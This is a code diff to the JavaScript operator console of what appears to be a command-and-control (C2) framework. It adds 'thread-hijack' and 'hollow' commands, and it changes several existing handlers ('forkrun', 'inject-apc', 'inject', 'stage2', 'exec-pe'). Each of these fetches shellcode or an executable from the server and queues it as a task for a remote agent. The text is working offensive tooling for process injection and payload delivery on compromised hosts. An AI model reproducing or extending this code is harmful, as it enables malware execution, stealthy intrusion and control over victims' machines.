@@ -1453,7 +1453,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (!parts4[0]) { addConsoleOutput('usage: forkrun <shellcode.bin> [process]', '', null); return; }
       addConsoleOutput(`[*] Fetching ${parts4[0]} from server…`, '', null);
       try {
-        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(parts4[0])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        const fr = await fetch(`${BASE}/api/dl/${encodeURIComponent(parts4[0])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
         if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${parts4[0]}: ${fr.statusText}`, null); return; }
         const sc = new Uint8Array(await fr.arrayBuffer());
         payload = btoa(String.fromCharCode(...sc));
@@ -1462,11 +1462,41 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
       break;
     }
+    case 'thread-hijack': {
+      // thread-hijack <pid> <shellcode.bin>
+      const thParts = args.split(' ');
+      if (thParts.length < 2) { addConsoleOutput('usage: thread-hijack <pid> <shellcode.bin>', '', null); return; }
+      addConsoleOutput(`[*] Fetching ${thParts[1]} from server…`, '', null);
+      try {
+        const fr = await fetch(`${BASE}/api/dl/${encodeURIComponent(thParts[1])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${thParts[1]}: ${fr.statusText}`, null); return; }
+        const sc = new Uint8Array(await fr.arrayBuffer());
+        payload = btoa(String.fromCharCode(...sc));
+        taskType = 'THREAD_HIJACK';
+        taskArgs = JSON.stringify({pid: parseInt(thParts[0], 10)});
+      } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
+      break;
+    }
+    case 'hollow': {
+      // hollow <target.exe> <payload.bin|payload.exe>
+      const holParts = args.split(' ');
+      if (holParts.length < 2) { addConsoleOutput('usage: hollow <target.exe> <payload.bin>', '', null); return; }
+      addConsoleOutput(`[*] Fetching ${holParts[1]} from server…`, '', null);
+      try {
+        const fr = await fetch(`${BASE}/api/dl/${encodeURIComponent(holParts[1])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${holParts[1]}: ${fr.statusText}`, null); return; }
+        const sc = new Uint8Array(await fr.arrayBuffer());
+        payload = btoa(String.fromCharCode(...sc));
+        taskType = 'HOLLOW';
+        taskArgs = holParts[0];
+      } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
+      break;
+    }
     case 'inject-apc': {
       const parts5 = args.split(' ');
       if (!parts5[0]) { addConsoleOutput('usage: inject-apc <shellcode.bin> [process]', '', null); return; }
       try {
-        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(parts5[0])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        const fr = await fetch(`${BASE}/api/dl/${encodeURIComponent(parts5[0])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
         if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${parts5[0]}: ${fr.statusText}`, null); return; }
         const sc = new Uint8Array(await fr.arrayBuffer());
         payload = btoa(String.fromCharCode(...sc));
@@ -1481,7 +1511,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (parts6.length < 2) { addConsoleOutput('usage: inject <pid> <shellcode.bin>', '', null); return; }
       const pid = parts6[0];
       try {
-        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(parts6[1])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        const fr = await fetch(`${BASE}/api/dl/${encodeURIComponent(parts6[1])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
         if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${parts6[1]}: ${fr.statusText}`, null); return; }
         const sc = new Uint8Array(await fr.arrayBuffer());
         payload = btoa(String.fromCharCode(...sc));
@@ -1494,7 +1524,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       // stage2 <shellcode.bin>
       if (!args) { addConsoleOutput('usage: stage2 <shellcode.bin>', '', null); return; }
       try {
-        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(args)}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        const fr = await fetch(`${BASE}/api/dl/${encodeURIComponent(args)}`, {headers:{'Authorization':'Bearer '+TOKEN}});
         if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${args}: ${fr.statusText}`, null); return; }
         const sc = new Uint8Array(await fr.arrayBuffer());
         payload = btoa(String.fromCharCode(...sc));
@@ -1653,7 +1683,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (!efile) { addConsoleOutput('usage: exec-pe <binary.exe> [args]','',null); return; }
       addConsoleOutput(`[*] Fetching ${efile} from server…`,'',null);
       try {
-        const fer = await fetch(`${BASE}/dl/${encodeURIComponent(efile)}`,{headers:{'Authorization':'Bearer '+TOKEN}});
+        const fer = await fetch(`${BASE}/api/dl/${encodeURIComponent(efile)}`,{headers:{'Authorization':'Bearer '+TOKEN}});
         if (!fer.ok) { addConsoleOutput('',`Cannot fetch ${efile}: ${fer.statusText}`,null); return; }
         const pebytes = new Uint8Array(await fer.arrayBuffer());
         payload = btoa(String.fromCharCode(...pebytes));
